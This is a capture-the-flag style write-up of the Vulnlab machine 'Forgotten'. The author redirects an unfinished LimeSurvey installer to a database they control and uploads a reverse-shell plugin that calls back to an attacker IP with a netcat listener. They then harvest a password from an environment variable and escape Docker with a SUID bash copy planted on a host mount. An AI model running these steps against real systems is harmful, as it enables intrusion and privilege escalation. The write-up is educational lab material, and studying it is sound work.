---
title: Forgotten - Vulnlab
date: 2024-06-05 02:12:54
tags: [vulnlab, Easy]
categories: vulnlab
keywords: 'Vulnlab, Easy, Linux'
description: This machine was relatively fun, as it involved progressing through the installation of an unused web-application - which we will then exploit. Big props to xct for creating this machine, as I thought it was great learning material and fun to exploit.
cover: /images/vulnlab/forgotten-vl/forgotten_slide.png
top_img: /images/cyberpunk-red.jpg
toc: true
toc_number: false
---

This machine was relatively fun, as it involved progressing through the installation of an unused web-application - which we will then exploit. Big props to xct for creating this machine, as I thought it was great learning material and fun to exploit.

# Enumeration

Let's start with our usual NMAP scan to see what ports are open.

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-14 21:55 EDT
Nmap scan report for 10.10.113.195
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 25:94:a4:a0:85:b6:06:ae:b3:7b:5e:45:c1:b6:32:b5 (ECDSA)
|_  256 22:d1:a0:9e:e2:58:92:d3:7b:9d:86:0f:04:28:8c:65 (ED25519)
80/tcp open  http    Apache httpd 2.4.56
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: 403 Forbidden
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.11 (93%), Linux 3.2 - 4.9 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   99.64 ms  10.8.0.1
2   102.00 ms 10.10.113.195

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.32 seconds
```

I see a lot of these on HTB, so I'm relatively used to seeing just port 22 (SSH) and port 80 (HTTP) open. Nonetheless let's see specifically what's running on the web server.

![](/images/vulnlab/forgotten-vl/b.jpg)

This is interesting, as immediately the moment we try to access the base link for the website, it says we do not have access to the resource. At this point, I'm assuming that we are guaranteed to find subdirectories from a `gobuster` scan, since we have no other resources to access at this point.
`gobuster dir -u http://10.10.113.195/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`

Upon a brief few seconds of scanning, we are greeted with a 301 redirect to `/survey`.

```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/survey               (Status: 301) [Size: 315] [--> http://10.10.113.195/survey/]
/server-status        (Status: 403) [Size: 278]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

Upon accessing the redirect, we are brought to an installation page for `LimeSurvey`.

# Exploiting Limesurvey Installation

Based off some research, it seems as though LimeSurvey is an open-source survey application that is used to develop online surveys and quizzes for its audience. It's primarily built up in PHP and utilizes SQL database applications such as MySQL, PostgreSQL, or even the Windows alternative of MSSQL.

This specific product seems to be marketed towards researchers, universities, web developers and students alike.

![](/images/vulnlab/forgotten-vl/b_1.jpg)

I researched into a few CVEs for LimeSurvey 6.3.7, however there wasn't much that I could find regarding our specific instance of it. Most of the CVEs related to versions 5.0, 3.0, and a few versions in between.

Nonetheless, we can progress with the installation, so we'll continue to do that until something particularly interesting comes up.

I've listed my thoughts on each section of the installation page below in the form of a list and what I think we could potentially accomplish.

1. Welcome -> Contains Language selection and `installation start` option.
2. License -> Regulatory information, nothing out of the ordinary.
3. Pre-installation Check -> Contains vital information regarding the services used for this LimeSurvey instance.

I'd like to point out something interesting - it seems as though a MySQL database option is present within the pre-installation check. That being said, we could not see one on the frontend of the server (based off our NMAP scan), nor is the option checked off within this screen.

The other information on this page does not seem to be as important, as the PHP version does not seem to be exploitable to my awareness.

4. Configuration -> Main attack path concern, allows us to configure various parts of the application - namely the database.

As explained previously, this section of the installation page seemed odd at first glance as it allows us to configure the MySQL database association with our LimeSurvey instance.

5. Database settings -> Unconfigurable until database configuration is completed.
6. Administrator settings -> Unconfigurable until database configuration is completed.

As I explained previously, the database configuration portion of the installation seems the most interesting. The particular section within this page that I'm referring to is the `Database location` section, which is seemingly allowing us to allocate an IP address of a database to the LimeSurvey instance.

![](/images/vulnlab/forgotten-vl/c.jpg)

While this is preset to `localhost`, I don't see any reason as to why we couldn't alter this to potentially point somewhere else - such as to our own machine.

# Local MySQL Configuration

So with that in mind, let's try to set up our own MySQL database server within our attack machine. https://www.geeksforgeeks.org/mysql-in-kali-linux-command-line/

```
daz@daz$ sudo apt install mariadb-server

daz@daz$ sudo systemctl start mysql

daz@daz$ sudo service mysql status
● mariadb.service - MariaDB 10.11.6 database server
     Loaded: loaded (/usr/lib/systemd/system/mariadb.service; disabled; preset: disabled)
     Active: active (running) since Tue 2024-05-14 22:52:07 EDT; 1min 36s ago
     [...snip...]

daz@daz$ sudo mysql
```

So we'll need to specify a user to authenticate as for our particular case, which I used this [article](https://www.strongdm.com/blog/mysql-create-user-manage-access-privileges-how-to#:~:text=Create%20a%20new%20MySQL%20user%20account&text=To%20create%20a%20new%20user,localhost'%20IDENTIFIED%20BY%20'password'%3B) on StrongDM to help with.

I'll outline the steps we need to take in order to create a database and set up the necessary privileges to a user for our LimeSurvey installation.

First we'll need to create a database to use, since LimeSurvey requires a `Database name` to be supplied with the installation.

```
MariaDB [(none)]> CREATE DATABASE limesurvey;
Query OK, 1 row affected (0.001 sec)
```

Next, we'll create a user under the alias `lime_user` who will have all of the necessary privileges to our setup.

```
MariaDB [(none)]> CREATE USER 'lime_user'@'%' IDENTIFIED by 'lime_user' WITH GRANT OPTION;
Query OK, 0 rows affected (0.006 sec)
```

Note that the `%` in our user creation query essentially acts as a wildcard for all interfaces.

The next concern we need to focus on is the specific privileges that our user has in relation to what we need for the setup. To any beginners, a MySQL privilege is essentially any ruleset or specified rule that a MySQL user has that regulates their actions on a database. This essentially restricts the user into performing various actions on the database based on the privileges they are given. This can be broken up into 4 different types of privileges:

**Global Privileges**: These privileges apply to every database on the hosted server. By default, administrative privileges will fall into this category as they enable a user to perform operations that are relative to a specific database.
**Database Privileges**: As expected in the name, these privileges apply solely to specified databases and all objects within those databases (i.e. columns, tables, entries, etc.).
**Proxy Privileges**: These allow a user to act in the context of other users and adopt their same privileges within the space of the situation they are involved in.
**Object Privileges**: These privileges apply solely to the types of objects stored in a database and can be granted between a set of objects if needed.

In a red-teaming environment such as an enterprise infrastructure, we'd want to create a user that looks relatively normal and in-line with regular options as not to arise suspicious. We can do this by delegating specific privileges to them such as `INSERT` or `ALTER` dependent on what is needed for the setup.

However this won't be the case for our situation, so we can grant them `ALL PRIVILEGES` so they can perform any actions needed.

```
MariaDB [(none)]> GRANT ALL ON *.* TO 'lime_user'@'%' WITH GRANT OPTION;
Query OK, 0 rows affected (0.006 sec)
```

Note that we're essentially saying that our username/password is `lime_user:lime_user` with the above query.*

We can confirm that our privileges have been granted to the specific user with the below query.

```
MariaDB [(none)]> SHOW GRANTS for 'lime_user'@'%';
+-------------------------------------------------------------------------------------------------------------------------------------+
| Grants for lime_user@%                                                                                                              |
+-------------------------------------------------------------------------------------------------------------------------------------+
| GRANT ALL PRIVILEGES ON *.* TO `lime_user`@`%` IDENTIFIED BY PASSWORD '*0F1EF1AB79F549AD4FE495927D8C200E7413BD85' WITH GRANT OPTION |
+-------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.000 sec)
```


Another thing we'll also need to do is configure the bind address for our MySQL server. By default, it's meant to listen solely on localhost as it acts as a backend server.

We can do this by editing `/etc/mysql/mariadb.conf.d/50-server.cnf` and changing the `bind-address` to `0.0.0.0` to listen on all interfaces.

This should allow the remote configuration to access our MySQL server and populate any fields needed. We can then restart our MySQL server with `sudo systemctl restart mysql`

We'll also need flush all of our privileges to ensure that they are configured correctly.

```
MariaDB [(none)]> FLUSH PRIVILEGES;
Query OK, 0 rows affected (0.001 sec)
```

# Redirecting Database Configuration to Local MySQL

With that, our backend database configuration should be finished and ready for the LimeSurvey setup. We'll fill in the necessary parameters into the configuration page and hope for any progress.

![](/images/vulnlab/forgotten-vl/d.jpg)

If we have followed all the previous steps and select the `Next` button, we can see that we're greeted with a message that is asking us to populate the `limesurvey` database. It also tells us that the database already exists, since we've already created it the previous setup steps. We'll select `Populate database`.

Afterwards, we're brought to an administration configuration, to which we can configure our admin credentials to just be `daz:daz` and just populate the rest with fake information.

![](/images/vulnlab/forgotten-vl/e.jpg)

It then notifies us that our password has been confirmed and that it will allow us to authenticate to the administration panel. We'll select `Administration` to access this panel.*

We're brought to a login page, to which we can use the same credentials that we provided within the configuration portion of the setup.

![](/images/vulnlab/forgotten-vl/f.jpg)

# Limesurvey RCE

We're greeted with the LimeSurvey administration panel, which seems to have a lot of stuff from us to mess with. Upon first glance, I was immediately drawn into the `Plugin` and `Theme` functionalities within the `Configuration` tab, so we'll see if we can potentially upload anything for RCE.

Generally with web-applications like these, if we're allowed to upload a plugin, we can upload a malicious reverse shell and have it callback to our machine.

The resource we'll use to generate our reverse shell can be found [here](https://github.com/Y1LD1R1M-1337/Limesurvey-RCE).

The steps can be outlined below for how I used it, though you can also reference the README file within the repository on how to use it.

Firstly, let's clone the repository with `git clone https://github.com/Y1LD1R1M-1337/Limesurvey-RCE.git`. This will clone the repository to our machine, to which we can use the files within it.

According to the README, all that is required of us is to compress the `php-rev.php` and `config.xml` to a zip file and upload it as a plugin. There are a few prerequisites that we'll need to take into account in terms of file changes before sending the plugin into the server.

First, let's change the `php-rev.php` IP address and port to point to a netcat reverse shell that we'll stand up on our attack machine in a few moments.

`$ip = '10.8.0.173';`
`$port = 9001;`

Next, we'll need to change the `config.xml` to make it usable on our current LimeSurvey version. If we do not change this, LimeSurvey will tell us that our plugin is incompatible when we attempt to upload it. This is within the `<compatibility>` subcategory within the xml file.

`<version>6.3.7</version>`

Afterwards, let's start a netcat reverse shell to listen on our attack machine so we can receive a callback when the reverse shell is executed.

`nc -lvnp 9001`

Finally, let's compress the two files to a zip archive and prepare to send it in to LimeSurvey.

`zip Y1LD1R1M.zip config.xml php-rev.php`

We can now upload our archive to the LimeSurvey `Plugins` panel, as denoted below.

![](/images/vulnlab/forgotten-vl/g.jpg)

If we have performed all the steps prior correctly, LimeSurvey will allow us to install the plugin after this page.

The plugin can now be accessed at `http://10.10.113.195/survey/upload/plugins/Y1LD1R1M/php-rev.php`.

Accessing this will execute our reverse shell and generate a session for us through netcat as the `limesvc` user.

![](/images/vulnlab/forgotten-vl/h.jpg)

# Host Reconnaissance

Now that we are on the system and have successfully exploited the web-application, though you'll find that there is no user flag.

This was relatively confusing, as I looked within the Wiki and found that there was indeed a user flag that was present on the machine.

To make our enumeration a little easier, I uploaded the `Linpeas` script which you can find [here](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS). `Linpeas` will essentially enumerate the entire filesystem and return and pertinent information it finds for us.

After running the `Linpeas` script on the remote machine, you'll find in it's output that there is an environment variable set that lists the password of the user through SSH.

`LIMESURVEY_PASS=[...snip...]`

Also, you'll notice that there are a large amount of docker settings and configurations present on the machine, making me assume that we're currently in a docker container.

```
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/53HNCQFKU7UT4MRNHXETIEU7PS:/var/lib/docker/overlay2/l/EC46IKT2LF6IUMTKX5EYK6Y6NS:/var/lib/docker/overlay2/l/AVXFR7EGT4F5744IOUZXTAPAXP:/var/lib/docker/overlay2/l/P5AO7VJP3KS26RV7L4G4A3CQMO:/var/lib/docker/overlay2/l/DUMS4MOPBZYYCT5MLU3KOIHV67:/var/lib/docker/overlay2/l/E6PFD55HUOLSDVI5HFVSG2MKY6:/var/lib/docker/overlay2/l/F2C2GU57ABILW44DR6N7IOAS2U:/var/lib/docker/overlay2/l/MTDNHTDTAHLYFOE23OONITLATE:/var/lib/docker/overlay2/l/HVR5FUOEP75JC4WLOLQCLICZW5:/var/lib/docker/overlay2/l/45JVDGBN2HJGR4ZFC56CA3QEFE:/var/lib/docker/overlay2/l/BLHTPLHTIDJITGF5LG7NDGIHIQ:/var/lib/docker/overlay2/l/ON6NXIXZRZZCFUPSYDLFPND5XG:/var/lib/docker/overlay2/l/URCYD6PEIO427ROGBDDSPOX7X4:/var/lib/docker/overlay2/l/TKNY7I37KDSR7UM34B7EAJWLEX:/var/lib/docker/overlay2/l/NI6IE4U3RKI3MI3XAZ7VSTRT5U:/var/lib/docker/overlay2/l/R2CP4KV5O4GJ4TW3FS73ARJZUR:/var/lib/docker/overlay2/l/JENNFERKWWS2TYSPK7WT7IGYT4:/var/lib/docker/overlay2/l/MMP56DFNWIP27YOKHUYTI3CVJ4:/var/lib/docker/overlay2/l/UBBT3YOEP4MEDPPJR5X4D474QX:/var/lib/docker/overlay2/l/ZHODKFSJJ4IAMIIQW7GBHG5QA3:/var/lib/docker/overlay2/l/WHNHWNHOFTA3DGNRVL3B3MMNY6:/var/lib/docker/overlay2/l/TQ6Z55HNEUJUXYWNUWJ4E5BLR3:/var/lib/docker/overlay2/l/UVBX7ES72OROVYQQPYGPTEIA4D:/var/lib/docker/overlay2/l/HCBBV74XSEA5GRAMKLUM7VELUP:/var/lib/docker/overlay2/l/VNQTVVELYXHIW5JNA2W7VHHGHA,upperdir=/var/lib/docker/overlay2/1a43e7d4669803c0891d7262954f27e54c5528c77990d3da808fa53d6b67ccdf/diff,workdir=/var/lib/docker/overlay2/1a43e7d4669803c0891d7262954f27e54c5528c77990d3da808fa53d6b67ccdf/work,nouserxattr)
/etc/apache2/conf-available/docker-php.conf-<FilesMatch \.php$>
/etc/apache2/conf-available/docker-php.conf:	SetHandler application/x-httpd-php
/etc/apache2/conf-enabled/docker-php.conf-<FilesMatch \.php$>
/etc/apache2/conf-enabled/docker-php.conf:	SetHandler application/x-httpd-php
2023-12-02+15:30:12.4134549900 /.dockerenv
/.dockerenv
```

Since we technically have credentials to the machine, we could try using SSH and logging into the machine. To my surprise, this worked and we can find a usable user.txt flag within the home directory of the `limesvc` user.

![](/images/vulnlab/forgotten-vl/i.jpg)

Now that we have the user flag, we can continue to enumerate for privilege escalation.

# Docker Breakout Privilege Escalation

We can run `sudo -l` with the user's password to determine any privileges that we have as this user. Unfortunately, this does not return any valid results as `user limesvc may not run sudo`.

We'll need to find another way for privilege escalation aside from privileges. Since we had to breakout of a docker container earlier, we can try and see if there's an additional privilege escalation vector we can potentially do on the machine in order to gain `root`.

One of the common vectors of attack through docker breakouts is utilizing mounts. Mounts essentially allow you to exchange or download files to and from the respective client machine (whether that be the docker container or the actual host itself). I had to exploit this through an NFS share on my Hybrid writeup. It involved us having to view the NFS read/write permissions on the share that was mounted, write a file to it, and then copy the permissions to the binary before running it as another user. While this was relatively easy to view the permissions via the NFS share, this is a different story with docker containers.

A great solution to visualize the permissions for mounts on a docker container is by utilizing [CDK](https://github.com/cdk-team/CDK), a toolset that was made to enumerate container capabilities. This will be helpful to run on the docker container, as it'll help us determine if there are any to exploit.

Note that I uploaded the `CDK` binary through sliver, if you want to do it manually you can use `curl` with parameters `http://(IP):(PORT)/cdk_linux_amd64 -O cdk` and also stand up a simple Python HTTP server on your host (just as an example).

```
$ ./cdk_linux_amd64 evaluate --full > cdk.txt

sliver> download cdk.txt
```

This file has been downloaded on our host, and you'll see an output of capabilities printed to your screen when you try to read it. Let's focus on the `Mounts` section.

```
[  Information Gathering - Mounts  ]
0:45 / / rw,relatime - overlay overlay rw,lowerdir=/var/lib/docker/overlay2/l/53HNCQFKU7UT4MRNHXETIEU7PS:/var/lib/docker/overlay2/l/EC46IKT2LF6IUMTKX5EYK6Y6NS:/var/lib/docker/overlay2/l/AVXFR7EGT4F5744IOUZXTAPAXP:/var/lib/doc

[...snip...]

259:1 /var/lib/docker/containers/efaa6f5097edd5289e5af809a8885d4eae195426317ee5cdba47c1ff7c1ca68d/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/root rw,discard,errors=remount-ro
259:1 /var/lib/docker/containers/efaa6f5097edd5289e5af809a8885d4eae195426317ee5cdba47c1ff7c1ca68d/hostname /etc/hostname rw,relatime - ext4 /dev/root rw,discard,errors=remount-ro
259:1 /var/lib/docker/containers/efaa6f5097edd5289e5af809a8885d4eae195426317ee5cdba47c1ff7c1ca68d/hosts /etc/hosts rw,relatime - ext4 /dev/root rw,discard,errors=remount-ro
259:1 /opt/limesurvey /var/www/html/survey rw,relatime - ext4 /dev/root rw,discard,errors=remount-ro
0:48 /bus /proc/bus ro,nosuid,nodev,noexec,relatime - proc proc rw
0:48 /fs /proc/fs ro,nosuid,nodev,noexec,relatime - proc proc rw
0:48 /irq /proc/irq ro,nosuid,nodev,noexec,relatime - proc proc rw
0:48 /sys /proc/sys ro,nosuid,nodev,noexec,relatime - proc proc rw
0:48 /sysrq-trigger /proc/sysrq-trigger ro,nosuid,nodev,noexec,relatime - proc proc rw
0:53 / /proc/acpi ro,relatime - tmpfs tmpfs ro,inode64
0:49 /null /proc/kcore rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64
0:49 /null /proc/keys rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64
0:49 /null /proc/timer_list rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64
0:54 / /proc/scsi ro,relatime - tmpfs tmpfs ro,inode64
0:55 / /sys/firmware ro,relatime - tmpfs tmpfs ro,inode64
```

While a lot of these don't seem very interesting, you'll notice that there's a mount pointing towards `/opt/limesurvey` on the host machine. We can confirm that this is a folder by checking through our SSH session on the host machine.

```
limesvc@ip-10-10-200-233:/opt/limesurvey$ ls
LICENSE      admin        docs         installer  node_modules      psalm-all.xml     setdebug.php  upload
README.md    application  gulpfile.js  locale     open-api-gen.php  psalm-strict.xml  themes        vendor
SECURITY.md  assets       index.php    modules    plugins           psalm.xml         tmp
```

It seems that the mount specifically is pointing towards `/dev/root`. While this is the location of the mount, the mount itself is pulling the contents of `/opt/limesurvey` to the `/dev/root` directory and can be modified through the docker container.

The location of the mount on our docker container that is connected to `/opt/limesurvey` is denoted as `/var/www/html/survey`, which is the base directory of the LimeSurvey service.

So the exploitation for this seems to be relatively simple. First since I didn't do it before, we'll login to the docker container as root due to the `limesvc` user's sudo privileges.

If you run into a `sudo` error that states you need a proper terminal to read the password, I would usually recommend just creating a proper shell with tools like Python or `stty`. The issue is that we're in a docker container and don't have access to either of those tools - thus I'd recommend using a C2 such as [Sliver](https://github.com/BishopFox/sliver) to have it create a proper terminal for you.

```
limesvc@efaa6f5097ed:/home/limesvc$ sudo -l
[sudo] password for limesvc: 
Matching Defaults entries for limesvc on efaa6f5097ed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User limesvc may run the following commands on efaa6f5097ed:
    (ALL : ALL) ALL
limesvc@efaa6f5097ed:/home/limesvc$

limesvc@efaa6f5097ed:/home/limesvc$ sudo su
root@efaa6f5097ed:/home/limesvc# whoami
root
root@efaa6f5097ed:/home/limesvc#
```

# Exploiting Mounted Root-SUID Binary

So just a brief snippet of how sudo privileges work, our `root` user has an ID value of 0, in which every default root user will have this privilege ID value set. Our `limesvc` on our SSH user does not have this ID set to them, and is not allowed to run any values within the context of root.

However, we do have the privileges of root within our docker container and a way to transfer this file to our host machine. Thus, if we are able to change the contents of a shell binary in our docker container, have it adopt the privileges of root, and adjust the SUID bit of the binary - we should be able to escalate our privileges.

So first we'll copy the `/bin/bash` binary in our docker container to the mounted directory `/var/www/html/survey`. I'll also rename the binary to `./daz`.

`root@efaa6f5097ed:/var/www/html/survey# cp /bin/bash ./daz`

We'll then adjust the SUID bit of the binary using `chmod`. As context as to what this does - we're essentially saying to allow all users to be able to run this binary in the context of the root user. That means ANY user will be able to run this as root.

`root@efaa6f5097ed:/var/www/html/survey# chmod u+s ./daz`

Now, we should be able to go back to our SSH session and verify that the file is there.

```
limesvc@ip-10-10-200-233:/opt/limesurvey$ ls -la | grep daz
-rwsr-xr-x   1 root    root    1234376 May 15 21:06 daz
```

You'll see now that this file is owned by root, but we'll still be able to run it as our current user. If we run it with the `-p` option (which stands for privileged mode), it should generate a session for us as root.

```
limesvc@ip-10-10-200-233:/opt/limesurvey$ ls -la | grep daz
-rwsr-xr-x   1 root    root    1234376 May 15 21:06 daz
limesvc@ip-10-10-200-233:/opt/limesurvey$ ./daz -p
daz-5.1# whoami
root
daz-5.1#
```

And that's it! The root flag is within `/root/root.txt`, and thus we have completed this machine.

# Conclusion

Big thanks to xct for creating this machine, it was very fun and helped strengthen some post-exploitation methodologies that I had experienced briefly in the past. The LimeSurvey installation was also really interesting and helped with some brainstorming into the attack path.

# Resources

https://www.geeksforgeeks.org/mysql-in-kali-linux-command-line/
https://www.strongdm.com/blog/mysql-create-user-manage-access-privileges-how-to#:~:text=Create%20a%20new%20MySQL%20user%20account&text=To%20create%20a%20new%20user,localhost'%20IDENTIFIED%20BY%20'password'%3B
https://github.com/Y1LD1R1M-1337/Limesurvey-RCE
https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
https://github.com/cdk-team/CDK
https://github.com/BishopFox/sliver